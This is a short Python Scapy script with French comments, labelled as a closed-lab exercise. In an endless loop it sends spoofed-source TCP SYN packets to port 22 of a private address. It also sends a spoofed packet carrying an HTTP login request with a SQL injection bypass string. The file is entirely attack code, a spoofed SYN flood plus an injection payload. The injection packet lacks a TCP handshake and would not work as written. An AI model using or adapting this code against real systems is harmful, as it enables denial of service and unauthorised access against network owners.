from scapy.all import IP, TCP, Raw, send
import time
while 1 != 0 : 
    # Adresse source falsifiée (uniquement pour labo)
    fake_src_ip = "145.23.18.9"

    # Adresse de la cible dans ton lab
    target_ip = "172.16.62.132"

    # Construction de l'en-tête IP
    ip_layer = IP(src=fake_src_ip, dst=target_ip)

    # Construction TCP : paquet SYN
    tcp_layer = TCP(sport=44352, dport=22, flags="S", seq=1000)

    # Charge utile optionnelle
    payload = Raw(b"Test packet from spoofed source")

    # Assemblage du paquet complet
    packet = ip_layer / tcp_layer / payload

   

    # Envoi du paquet (⚠️ uniquement en labo fermé)

    send(packet, verbose=1)


    # Cible du LAB
    target_ip = "172.16.62.132"

    # Exemple éducatif de "payload" ressemblant à une requête malveillante
    sql_payload = (
        "GET /login.php?user=admin' OR '1'='1&pass=test HTTP/1.1\r\n"
        "Host: test.local\r\n"
        "User-Agent: Scapy-Lab\r\n"
        "Connection: close\r\n\r\n"
    )

    # Paquet IP/TCP
    ip_layer = IP(src=fake_src_ip, dst=target_ip)
    tcp_layer = TCP(sport=12345, dport=80, flags="PA", seq=1, ack=1)

    # Intégration du faux contenu HTTP
    packet = ip_layer / tcp_layer / Raw(load=sql_payload)

    # Affichage du paquet
    send(packet, verbose=1)
        
